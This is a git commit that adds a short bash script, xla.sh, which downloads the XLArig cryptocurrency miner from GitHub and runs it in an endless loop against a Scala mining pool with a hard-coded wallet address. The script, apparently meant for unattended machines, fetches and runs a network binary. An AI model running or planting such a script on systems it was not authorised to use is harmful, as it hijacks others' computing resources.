f412495b0e774fa08f85efad02094c6123821151
lushenry654 <85671596+lushenry654@users.noreply.github.com>
2021-11-04 18:48:48 +0700

    Update and rename vrsc.sh to xla.sh

---
+++ xla.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+apt update
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip
+while [ 1 ]; do
+./xlarig -o mine.scalaproject.io:3333 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p Q -a panthera -k -t2
+sleep 3
+done
+sleep 9999
